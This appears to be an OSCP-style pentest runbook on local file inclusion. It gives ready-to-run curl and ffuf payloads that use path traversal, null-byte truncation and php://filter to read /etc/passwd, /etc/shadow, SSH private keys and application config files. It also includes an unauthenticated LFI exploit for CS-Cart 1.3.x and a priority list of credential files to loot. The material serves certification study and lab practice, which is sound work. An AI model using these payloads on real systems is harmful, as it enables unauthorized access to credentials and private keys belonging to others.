---
tags: [oscp, web-app, lfi, runbook]
box_sources: [Payday, Snookums]
---

# Web App — LFI (Local File Inclusion)

*A web app includes a file based on a user-supplied path. Goal: read sensitive files (creds, keys, passwd) or escalate to RCE.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `curl "http://$BoxIP/$WebPath?$Param=../../../../../../../etc/passwd"` | `/etc/passwd` contents in response | File include param with no null-byte needed (PHP 7+, or non-PHP) | Start with 7–10 `../` — overshoot is harmless, undershoot returns nothing. Adjust count until you hit `/`. | Read output for usernames → [[SSH - Brute Force]] or [[Creds - Hash Cracking]] | Add `%00` null byte — see below |
| `curl "http://$BoxIP/$WebPath?$Param=../../../../../../../etc/passwd%00"` | `/etc/passwd` contents in response | PHP ≤ 5.3 (null byte truncation bug) | `%00` terminates the string before any appended `.php` extension. Required when the app appends an extension to included paths. Check PHP version from nmap banner. | Same as above | Try `....//....//....//etc/passwd` (double-dot bypass for basic filters) |
| `curl "http://$BoxIP/$WebPath?$Param=../../../../../../../etc/shadow"` | Hashed root/user passwords | You have enough read permission (usually needs root) | If readable, crack with `john` or `hashcat`. Often not accessible from www-data. | [[Creds - Hash Cracking]] | Try `/etc/passwd` instead — always readable |
| `curl "http://$BoxIP/$WebPath?$Param=../../../../../../../home/$Username/.ssh/id_rsa"` | Private SSH key | User has an SSH key and the web process can read it | Saves bruteforce entirely if it lands. Try common users from `/etc/passwd` first. | `loot key <path>` → SSH straight in | — |

| `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$BoxIP/SCRIPT.php?FUZZ=php://filter/convert.base64-encode/resource=SCRIPT.php" -fs <baseline> -t 50 -s` | ffuf prints a parameter name | Script processes params via include() but the param name isn't obvious | Baseline = `curl http://$BoxIP/SCRIPT.php \| wc -c`. Any hit = that param goes into include(). Run against ALL PHP files found by gobuster, not just index.php. | Test that param: `curl "...?HIT=php://filter/convert.base64-encode/resource=SCRIPT.php" \| grep -oP '[A-Za-z0-9+/]{20,}={0,2}' \| tail -1 \| base64 -d` | Try POST body fuzzing with `ffuf -X POST -d "FUZZ=php://filter/..."` |
| `curl -s "http://$BoxIP/SCRIPT.php?$Param=php://filter/convert.base64-encode/resource=TARGET.php" \| grep -oP '[A-Za-z0-9+/]{20,}={0,2}' \| tail -1 \| base64 -d` | PHP source of TARGET.php | LFI confirmed | Reads the raw PHP source (not executed). `tail -1` gets the last base64 block (the file content). Use `{200,}` for large files. Reveals hardcoded creds, other include() calls, DB config. Target: `db.php`, `config.php`, `phpGalleryConfig.php`, `wp-config.php`. | Read creds from output → `loot cred` → try SSH or DB directly | Lower `{20,}` threshold if small file; try `tail -2` if wrong block returned |

---

## CS-Cart 1.3.x — Specific Notes (EDB 48890)

**Unauthenticated LFI via `classes_dir` parameter:**

```bash
curl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"
```

- No authentication required
- Null byte (`%00`) required — server runs PHP 5.2.x
- PHP `Fatal error` after the file contents is harmless — the include succeeded before the class failed
- Confirmed on CS-Cart ≤ 1.3.4

**To confirm CS-Cart version:** browse to `http://$BoxIP/` — page title says "CS-Cart" and footer often shows version.

---

## What to Read Once LFI is Confirmed

Priority order:

| File | Why |
|------|-----|
| `/etc/passwd` | Enumerate real users with `/bin/bash` shell |
| `/etc/shadow` | Password hashes (rarely readable) |
| `/home/$Username/.ssh/id_rsa` | SSH private key — skips bruteforce |
| `/home/$Username/.bash_history` | Commands run — may contain passwords or paths |
| App config files | DB creds, API keys — location varies by app |
| `/var/www/html/config.php` (or similar) | CS-Cart / WordPress / other CMS creds |

---

## PHP Null Byte — Version Reference

| PHP Version | Null byte in file paths |
|---|---|
| ≤ 5.3.3 | **Vulnerable** — `%00` terminates path |
| ≥ 5.3.4 | Fixed — null byte raises warning, include fails |
| 7.x / 8.x | Fixed — use other bypass techniques |

---

## Screenshot Prompts

> 📸 After LFI returns file contents: `shot lfi-<filename>` (e.g. `shot lfi-passwd`)

---

**Module:** [[09. Common Web Application Attacks|Common Web Application Attacks]]

---

## External Resources

| Resource | Link | Use when |
|---|---|---|
| HackTricks — File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Full LFI technique reference — bypasses, wrappers, LFI2RCE chains (log poisoning, session files, uploads). Local copy: `ht read pentesting-web/file-inclusion` |
| PayloadsAllTheThings — File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass payloads: null byte, double encoding, path truncation, UTF-8 encoding, filter bypass |
| PayloadsAllTheThings — Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | When LFI escalates to RCE via stream wrappers — `php://filter`, `data://`, `phar://`, `zip://` |
| CyberChef | [CyberChef](https://gchq.github.io/CyberChef/) | Decode base64 blobs returned by `php://filter` — use "From Base64" recipe to read the PHP source |
| ippsec.rocks | Search [lfi](https://ippsec.rocks/?#lfi) · [log poison](https://ippsec.rocks/?#log%20poison) · [php filter](https://ippsec.rocks/?#php%20filter) | Video walkthroughs of LFI and log poisoning on real HTB boxes |
